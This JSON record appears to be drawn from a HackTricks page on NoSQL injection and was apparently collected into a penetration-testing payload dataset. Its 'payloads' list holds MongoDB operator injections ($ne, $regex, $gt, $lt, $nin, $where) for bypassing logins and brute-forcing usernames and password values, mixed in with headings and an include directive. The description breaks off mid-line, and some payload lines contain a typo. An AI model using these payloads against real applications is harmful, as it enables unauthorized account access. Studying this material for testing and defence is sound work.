{
  "id": "pentesting_web_b584478bca1a",
  "category": "pentesting-web",
  "title": "nosql injection",
  "description": "# NoSQL injection\n\n{{#include ../banners/hacktricks-training.md}}\n\n## Exploit\n\nIn PHP you can send an Array changing the sent parameter from _parameter=foo_ to _parameter[arrName]=foo._\n\nThe exploits are based in adding an **Operator**:\n\n```bash\nusername[$ne]=1$password[$ne]=1 #<Not Equals>\nusername[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter\nusername[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value\nusername[$eq]=ad",
  "payloads": [
    "# NoSQL injection",
    "{{#include ../banners/hacktricks-training.md}}",
    "## Exploit",
    "In PHP you can send an Array changing the sent parameter from _parameter=foo_ to _parameter[arrName]=foo._",
    "The exploits are based in adding an **Operator**:",
    "```bash",
    "username[$ne]=1$password[$ne]=1 #<Not Equals>",
    "username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter",
    "username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value",
    "username[$eq]=admin&password[$ne]=1 #<Equals>",
    "username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users",
    "username[$ne]=admin&pass[$gt]=s #<Greater Than>",
    "username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)",
    "{ $where: \"this.credits == this.debits\" }#<IF>, can be used to execute code",
    "### Basic authentication bypass"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/pentesting-web/nosql-injection.md"
  ]
}